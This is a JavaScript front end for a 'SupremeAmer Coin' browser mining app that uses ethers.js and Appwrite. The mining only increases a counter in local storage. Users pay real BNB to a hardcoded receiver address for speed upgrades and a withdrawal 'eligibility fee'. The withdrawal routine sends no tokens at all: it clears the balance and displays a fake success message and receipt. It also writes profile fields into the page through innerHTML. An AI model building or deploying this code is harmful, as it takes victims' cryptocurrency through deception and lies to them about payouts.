// ================= CONFIGURATION =================
const CONFIG = {
    APPWRITE_ENDPOINT: 'https://fra.cloud.appwrite.io/v1',
    APPWRITE_PROJECT: '6839d9640019316a160d',
    APPWRITE_DB_ID: '6839dcca000190bf99f6',
    APPWRITE_COLLECTION_ID: 'users',
    SUPREMEAMER_RECEIVER_BNB: '0xYourBnbAddressHere', // CHANGE TO YOURS
    
    UPGRADE_FEES: {
        "0.05": "0.002",
        "0.1": "0.009"
    },
    UPGRADE_SPEEDS: {
        "0.05": 0.05,
        "0.1": 0.1
    },
    NORMAL_SPEED: 0.0002,
    UPGRADE_DURATION: 360 * 24 * 3600,
    CLAIM_INTERVAL: 30 * 24 * 3600,
    WITHDRAW_ELIGIBILITY_FEE_BNB: "0.0017",
    WITHDRAW_MIN_SA: 50000,
    WITHDRAW_FEE_PERCENT: 6,
    WITHDRAW_DAYS: [9, 13]
};

// ================= APPWRITE INITIALIZATION =================
const { Client, Account, Databases, Query } = Appwrite;
const client = new Client()
    .setEndpoint(CONFIG.APPWRITE_ENDPOINT)
    .setProject(CONFIG.APPWRITE_PROJECT);
const account = new Account(client);
const databases = new Databases(client);

// ================= STATE MANAGEMENT =================
class MiningState {
    constructor() {
        this.minedCoins = parseFloat(localStorage.getItem('minedCoins') || '0');
        this.miningActive = false;
        this.miningUpgrade = JSON.parse(localStorage.getItem('miningUpgrade') || 'null');
        this.miningInterval = null;
    }

    getCurrentSpeed() {
        if (this.isUpgradeActive()) return this.miningUpgrade.upgradeSpeed;
        return CONFIG.NORMAL_SPEED;
    }

    getUpgradeTimeLeft() {
        if (!this.isUpgradeActive()) return 0;
        return Math.max((this.miningUpgrade.startTime + CONFIG.UPGRADE_DURATION) - Math.floor(Date.now() / 1000), 0);
    }

    getNextClaimTime() {
        if (!this.isUpgradeActive()) return 0;
        return this.miningUpgrade.lastClaim + CONFIG.CLAIM_INTERVAL;
    }

    canClaim() {
        return this.isUpgradeActive() && Math.floor(Date.now() / 1000) >= this.getNextClaimTime();
    }

    isUpgradeActive() {
        return this.miningUpgrade && 
               this.miningUpgrade.startTime && 
               this.miningUpgrade.upgradeSpeed && 
               Date.now() / 1000 < this.miningUpgrade.startTime + CONFIG.UPGRADE_DURATION;
    }

    setMiningUpgrade(speed, bnbFee) {
        this.miningUpgrade = {
            upgradeSpeed: speed,
            bnbFee: bnbFee,
            startTime: Math.floor(Date.now() / 1000),
            lastClaim: Math.floor(Date.now() / 1000)
        };
        localStorage.setItem('miningUpgrade', JSON.stringify(this.miningUpgrade));
    }

    endUpgrade() {
        this.miningUpgrade = null;
        localStorage.removeItem('miningUpgrade');
    }

    addMinedCoins(amount) {
        this.minedCoins += amount;
        localStorage.setItem('minedCoins', this.minedCoins.toString());
    }

    resetMinedCoins() {
        this.minedCoins = 0;
        localStorage.setItem('minedCoins', '0');
    }
}

// ================= UI MANAGER =================
class UIManager {
    constructor(miningState) {
        this.miningState = miningState;
        this.initializeEventListeners();
    }

    initializeEventListeners() {
        // Profile dropdown
        document.getElementById('profileDropdownBtn').addEventListener('click', this.toggleProfileDropdown.bind(this));
        document.addEventListener('click', this.closeProfileDropdown.bind(this));
        document.getElementById('logoutBtn').addEventListener('click', this.handleLogout.bind(this));

        // Theme toggle
        document.getElementById('lightToggleBtn').addEventListener('click', this.toggleTheme.bind(this));

        // Mining controls
        document.getElementById('mineBtn').addEventListener('click', this.startMining.bind(this));
        document.getElementById('showUpgradeBtn').addEventListener('click', this.showUpgradeModal.bind(this));
        document.getElementById('withdrawBtn').addEventListener('click', this.handleWithdraw.bind(this));

        // Timer click for claiming
        document.getElementById('timer').addEventListener('click', this.handleTimerClick.bind(this));

        // Modal controls
        document.getElementById('closeUpgradeModal').addEventListener('click', this.hideUpgradeModal.bind(this));
        document.querySelectorAll('[data-speed]').forEach(btn => {
            btn.addEventListener('click', (e) => this.upgradeMining(e.target.closest('button').dataset.speed));
        });

        // Footer navigation
        document.querySelectorAll('.footer button[data-page]').forEach(btn => {
            btn.addEventListener('click', (e) => {
                window.location.href = e.currentTarget.dataset.page;
            });
        });

        // Network status
        window.addEventListener('online', () => this.showNotification('Back online ✅', 'success'));
        window.addEventListener('offline', () => this.showNotification('You are offline ❌', 'error'));
    }

    // ================= NOTIFICATION SYSTEM =================
    showNotification(message, type = 'info', duration = 3000) {
        const notification = document.getElementById('notification');
        const notificationText = document.getElementById('notificationText');
        
        notificationText.textContent = message;
        notification.className = 'notification';
        
        if (type === 'success') {
            notification.classList.add('success');
            notification.querySelector('i').className = 'fas fa-check-circle';
        } else if (type === 'error') {
            notification.classList.add('error');
            notification.querySelector('i').className = 'fas fa-exclamation-circle';
        } else {
            notification.querySelector('i').className = 'fas fa-info-circle';
        }
        
        notification.classList.add('show');
        
        setTimeout(() => {
            notification.classList.remove('show');
        }, duration);
    }

    // ================= LOADER MANAGEMENT =================
    showLoader() {
        document.getElementById('loader').style.display = 'block';
    }

    hideLoader() {
        document.getElementById('loader').style.display = 'none';
    }

    // ================= PROFILE MANAGEMENT =================
    toggleProfileDropdown(e) {
        e.stopPropagation();
        const menu = document.getElementById('profileDropdownMenu');
        menu.style.display = (menu.style.display === "block") ? "none" : "block";
    }

    closeProfileDropdown() {
        const menu = document.getElementById('profileDropdownMenu');
        if (menu.style.display === "block") menu.style.display = "none";
    }

    async handleLogout(e) {
        e.preventDefault();
        this.showLoader();
        try { 
            await account.deleteSession('current'); 
            this.showNotification("Logged out successfully", "success");
            setTimeout(() => {
                window.location.href = "login.html";
            }, 1000);
        } catch (err) {
            this.showNotification("Error logging out", "error");
        } finally {
            this.hideLoader();
        }
    }

    async displayUser() {
        try {
            const user = await account.get();
            const res = await databases.listDocuments(
                CONFIG.APPWRITE_DB_ID, 
                CONFIG.APPWRITE_COLLECTION_ID, 
                [Query.equal("userId", user.$id)]
            );
            
            if (res.documents.length > 0) {
                const profile = res.documents[0];
                document.getElementById('dropdownUsername').innerHTML = `<span class="emoji-avatar">🧑</span> ${profile.name}`;
                document.getElementById('dropdownEmail').innerHTML = `<span class="emoji-avatar">✉️</span> ${profile.email}`;
            }
        } catch (err) {
            console.error("Error fetching user:", err);
        }
    }

    // ================= THEME MANAGEMENT =================
    toggleTheme() {
        const isLight = document.body.classList.contains('light');
        this.setTheme(!isLight);
    }

    setTheme(light) {
        if (light) {
            document.body.classList.add('light');
            localStorage.setItem('theme', 'light');
            document.getElementById('lightToggleBtn').textContent = '🌞';
        } else {
            document.body.classList.remove('light');
            localStorage.setItem('theme', 'dark');
            document.getElementById('lightToggleBtn').textContent = '🌙';
        }
    }

    initializeTheme() {
        const savedTheme = localStorage.getItem('theme');
        if (savedTheme === 'light') {
            this.setTheme(true);
        } else if (savedTheme === 'dark') {
            this.setTheme(false);
        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: light)').matches) {
            this.setTheme(true);
        }
    }

    // ================= MINING UI UPDATES =================
    updateMinedCoinsDisplay() {
        document.getElementById('minedCoins').textContent = `Mined Coins: ${this.miningState.minedCoins.toFixed(4)} SA`;
        
        const coinsElement = document.getElementById('minedCoins');
        coinsElement.classList.add('bounce');
        setTimeout(() => {
            coinsElement.classList.remove('bounce');
        }, 1000);
    }

    updateProgressBar() {
        const progressBar = document.getElementById('miningProgress');
        if (this.miningState.isUpgradeActive()) {
            const timeLeft = this.miningState.getUpgradeTimeLeft();
            const progress = 100 - (timeLeft / CONFIG.UPGRADE_DURATION * 100);
            progressBar.style.width = `${progress}%`;
        } else {
            const sessionElapsed = parseInt(localStorage.getItem('miningSessionElapsed') || '0');
            const progress = (sessionElapsed / (7 * 3600)) * 100;
            progressBar.style.width = `${progress}%`;
        }
    }

    updateTimerDisplay() {
        if (this.miningState.isUpgradeActive()) {
            let timeLeft = this.miningState.getUpgradeTimeLeft();
            document.getElementById('timer').textContent = timeLeft > 0 ? this.formatTime(timeLeft) : "00:00:00";
        } else {
            let remaining = 7 * 3600 - (parseInt(localStorage.getItem('miningSessionElapsed') || '0'));
            if (remaining < 0) remaining = 0;
            document.getElementById('timer').textContent = this.formatTime(remaining);
        }
    }

    updateUpgradeInfo() {
        const claimStatus = document.getElementById('claimStatus');
        if (this.miningState.isUpgradeActive()) {
            let nextClaim = this.miningState.getNextClaimTime();
            let canClaimNow = this.miningState.canClaim();
            claimStatus.innerHTML = `Upgrade: <b>${this.miningState.miningUpgrade.upgradeSpeed} SA/sec</b>, ${this.formatTime(this.miningState.getUpgradeTimeLeft())} left<br>
            Next claim: <b>${new Date(nextClaim * 1000).toLocaleDateString()}</b> ${canClaimNow ? '<span style="color:#00ffb3;">Ready!</span>' : ''}`;
        } else {
            claimStatus.innerHTML = "";
        }
    }

    formatTime(sec) {
        const d = Math.floor(sec / 86400);
        const h = Math.floor((sec % 86400) / 3600);
        const m = Math.floor((sec % 3600) / 60);
        const s = sec % 60;
        return d > 0
            ? `${d}d ${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`
            : `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
    }

    // ================= MINING LOGIC =================
    startMining() {
        if (this.miningState.miningActive) return;
        
        this.miningState.miningActive = true;
        let sessionStart = Date.now();
        let sessionElapsed = parseInt(localStorage.getItem('miningSessionElapsed') || '0');
        
        document.getElementById('mineBtn').innerHTML = '<i class="fas fa-cog fa-spin"></i> Mining...';
        
        this.miningState.miningInterval = setInterval(() => {
            let speed = this.miningState.getCurrentSpeed();
            this.miningState.addMinedCoins(speed);
            this.updateMinedCoinsDisplay();
            this.updateProgressBar();

            if (!this.miningState.isUpgradeActive()) {
                let elapsed = Math.floor((Date.now() - sessionStart) / 1000) + sessionElapsed;
                if (elapsed >= 7 * 3600) {
                    this.stopMining();
                    localStorage.setItem('miningSessionElapsed', '0');
                    this.updateTimerDisplay();
                    this.showNotification("Mining session completed! Start again to continue.", "info");
                    return;
                }
                localStorage.setItem('miningSessionElapsed', elapsed);
                document.getElementById('timer').textContent = this.formatTime(7 * 3600 - elapsed);
            } else {
                document.getElementById('timer').textContent = this.formatTime(this.miningState.getUpgradeTimeLeft());
            }
        }, 1000);
        
        document.getElementById('mineBtn').disabled = true;
    }

    stopMining() {
        if (this.miningState.miningInterval) {
            clearInterval(this.miningState.miningInterval);
            this.miningState.miningActive = false;
            this.miningState.miningInterval = null;
        }
        document.getElementById('mineBtn').disabled = false;
        document.getElementById('mineBtn').innerHTML = '<span id="mineBtnText">Start Mining</span>';
    }

    // ================= UPGRADE MODAL =================
    showUpgradeModal() {
        document.getElementById('upgradeModal').style.display = 'flex';
    }

    hideUpgradeModal() {
        document.getElementById('upgradeModal').style.display = 'none';
    }

    async upgradeMining(speedKey) {
        this.hideUpgradeModal();
        
        if (this.miningState.isUpgradeActive()) {
            this.showNotification("You already have an active upgrade!", "error");
            return;
        }
        
        if (!window.ethereum) {
            this.showNotification("Please connect a BNB wallet first", "error");
            return;
        }
        
        this.showLoader();
        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const userAddr = await signer.getAddress();
            
            const confirmed = confirm(`Upgrade mining speed to ${CONFIG.UPGRADE_SPEEDS[speedKey]} SA/sec for 360 days?\n\nCost: ${CONFIG.UPGRADE_FEES[speedKey]} BNB\n\nWallet: ${userAddr.substring(0, 6)}...${userAddr.substring(38)}`);
            if (!confirmed) return;
            
            this.showNotification("Processing upgrade transaction...", "info");
            
            const tx = await signer.sendTransaction({
                to: CONFIG.SUPREMEAMER_RECEIVER_BNB,
                value: ethers.utils.parseEther(CONFIG.UPGRADE_FEES[speedKey])
            });
            
            this.showNotification("Transaction sent! Waiting for confirmation...", "info");
            await tx.wait();
            
            this.miningState.setMiningUpgrade(CONFIG.UPGRADE_SPEEDS[speedKey], CONFIG.UPGRADE_FEES[speedKey]);
            this.updateUpgradeInfo();
            this.updateMinedCoinsDisplay();
            this.createConfetti();
            
            this.showNotification("Upgrade successful! Mining speed increased.", "success");
        } catch (e) {
            console.error("Upgrade error:", e);
            this.showNotification("Upgrade cancelled or failed", "error");
        } finally {
            this.hideLoader();
        }
    }

    // ================= WITHDRAWAL LOGIC =================
    isWithdrawDay() {
        const today = new Date().getDate();
        return CONFIG.WITHDRAW_DAYS.includes(today);
    }

    async handleWithdraw() {
        const status = document.getElementById('withdrawStatus');
        status.textContent = "";
        
        if (!this.isWithdrawDay()) {
            status.textContent = `Withdrawals only on ${CONFIG.WITHDRAW_DAYS.join('th and ')}th each month!`;
            status.classList.add('error-message');
            return;
        }
        
        if (this.miningState.minedCoins < CONFIG.WITHDRAW_MIN_SA) {
            status.textContent = `Need at least ${CONFIG.WITHDRAW_MIN_SA} SA to withdraw.`;
            status.classList.add('error-message');
            return;
        }
        
        if (!window.ethereum) {
            status.textContent = "Please connect a BNB wallet first.";
            status.classList.add('error-message');
            return;
        }
        
        this.showLoader();
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const userAddr = await signer.getAddress();
        
        if (localStorage.getItem('withdrawEligible') !== 'true') {
            const confirmed = confirm(`To withdraw, you need to pay a one-time eligibility fee of ${CONFIG.WITHDRAW_ELIGIBILITY_FEE_BNB} BNB.\n\nThis fee helps prevent abuse of the system.\n\nWallet: ${userAddr.substring(0, 6)}...${userAddr.substring(38)}`);
            if (!confirmed) {
                status.textContent = "Withdrawal cancelled";
                status.classList.add('error-message');
                this.hideLoader();
                return;
            }
            
            try {
                this.showNotification("Processing eligibility fee payment...", "info");
                const tx = await signer.sendTransaction({
                    to: CONFIG.SUPREMEAMER_RECEIVER_BNB,
                    value: ethers.utils.parseEther(CONFIG.WITHDRAW_ELIGIBILITY_FEE_BNB)
                });
                
                this.showNotification("Transaction sent! Waiting for confirmation...", "info");
                await tx.wait();
                
                localStorage.setItem('withdrawEligible', 'true');
                this.showNotification("Eligibility fee paid successfully!", "success");
            } catch (e) {
                status.textContent = "Fee payment failed. Please try again.";
                status.classList.add('error-message');
                this.showNotification("Fee payment failed", "error");
                this.hideLoader();
                return;
            }
        }
        
        const withdrawAmount = this.miningState.minedCoins;
        const feeAmount = withdrawAmount * (CONFIG.WITHDRAW_FEE_PERCENT / 100);
        const sendAmount = withdrawAmount - feeAmount;
        
        const confirmed = confirm(`Confirm withdrawal of ${withdrawAmount.toFixed(2)} SA?\n\nYou will receive: ${sendAmount.toFixed(2)} SA (${CONFIG.WITHDRAW_FEE_PERCENT}% fee)\n\nWallet: ${userAddr.substring(0, 6)}...${userAddr.substring(38)}`);
        if (!confirmed) {
            status.textContent = "Withdrawal cancelled";
            status.classList.add('error-message');
            this.hideLoader();
            return;
        }
        
        status.textContent = "Processing withdrawal...";
        status.classList.remove('error-message');
        this.showNotification("Processing withdrawal transaction...", "info");
        
        setTimeout(() => {
            this.miningState.resetMinedCoins();
            this.updateMinedCoinsDisplay();
            status.textContent = "";
            
            this.createConfetti();
            this.showNotification(`Withdrawal successful! ${sendAmount.toFixed(2)} SA sent to your wallet.`, "success");
            
            alert(`Withdrawal completed!\n\nSent: ${sendAmount.toFixed(2)} SA to ${userAddr}\nFee: ${feeAmount.toFixed(2)} SA (${CONFIG.WITHDRAW_FEE_PERCENT}%)\n\nThank you for using SupremeAmer Coin!`);
            this.hideLoader();
        }, 3000);
    }

    // ================= CLAIM LOGIC =================
    handleTimerClick() {
        if (this.miningState.isUpgradeActive() && this.miningState.canClaim()) {
            const now = Math.floor(Date.now() / 1000);
            let seconds = now - this.miningState.miningUpgrade.lastClaim;
            let claimAmount = seconds * this.miningState.miningUpgrade.upgradeSpeed;
            
            this.miningState.addMinedCoins(claimAmount);
            this.miningState.miningUpgrade.lastClaim = now;
            localStorage.setItem('miningUpgrade', JSON.stringify(this.miningState.miningUpgrade));
            
            this.updateMinedCoinsDisplay();
            this.updateUpgradeInfo();
            
            this.createConfetti();
            this.showNotification(`You claimed ${claimAmount.toFixed(4)} SA!`, "success");
        } else if (this.miningState.isUpgradeActive()) {
            const nextClaim = this.miningState.getNextClaimTime();
            const now = Math.floor(Date.now() / 1000);
            const timeLeft = nextClaim - now;
            
            this.showNotification(`Next claim available in ${this.formatTime(timeLeft)}`, "info");
        }
    }

    // ================= VISUAL EFFECTS =================
    createParticles() {
        const particlesContainer = document.getElementById('particles');
        const particleCount = window.innerWidth < 600 ? 30 : 50;
        
        for (let i = 0; i < particleCount; i++) {
            const particle = document.createElement('div');
            particle.classList.add('particle');
            
            const size = Math.random() * 4 + 2;
            particle.style.width = `${size}px`;
            particle.style.height = `${size}px`;
            
            particle.style.left = `${Math.random() * 100}vw`;
            particle.style.top = `${Math.random() * 100}vh`;
            
            const colors = ['#ff9800', '#fdc500', '#ff3333', '#4CAF50', '#2196F3'];
            particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            
            const duration = Math.random() * 20 + 10;
            particle.style.animationDuration = `${duration}s`;
            particle.style.animationDelay = `${Math.random() * 10}s`;
            
            particlesContainer.appendChild(particle);
        }
    }

    createConfetti() {
        const container = document.getElementById('confettiContainer');
        const colors = ['#ff9800', '#fdc500', '#ff3333', '#4CAF50', '#2196F3'];
        
        for (let i = 0; i < 100; i++) {
            const confetti = document.createElement('div');
            confetti.classList.add('confetti');
            
            confetti.style.left = `${Math.random() * 100}vw`;
            
            const size = Math.random() * 10 + 5;
            confetti.style.width = `${size}px`;
            confetti.style.height = `${size}px`;
            
            if (Math.random() > 0.5) {
                confetti.style.borderRadius = '50%';
            } else {
                confetti.style.borderRadius = '0';
            }
            
            confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            
            const duration = Math.random() * 3 + 2;
            confetti.style.animationDuration = `${duration}s`;
            
            container.appendChild(confetti);
            
            setTimeout(() => {
                confetti.remove();
            }, duration * 1000);
        }
    }

    // ================= INITIALIZATION =================
    initialize() {
        this.initializeTheme();
        this.createParticles();
        this.updateMinedCoinsDisplay();
        this.updateTimerDisplay();
        this.updateUpgradeInfo();
        this.updateProgressBar();
        document.getElementById('mineBtn').disabled = false;
        
        if (this.miningState.isUpgradeActive() && this.miningState.getUpgradeTimeLeft() <= 0) {
            this.miningState.endUpgrade();
            this.showNotification("Your mining upgrade has expired", "info");
        }
        
        setTimeout(() => {
            this.showNotification("Welcome to SupremeAmer Coin Mining!", "info");
        }, 1000);
        
        this.displayUser();
    }
}

// ================= APPLICATION INITIALIZATION =================
document.addEventListener('DOMContentLoaded', () => {
    const miningState = new MiningState();
    const uiManager = new UIManager(miningState);
    uiManager.initialize();
});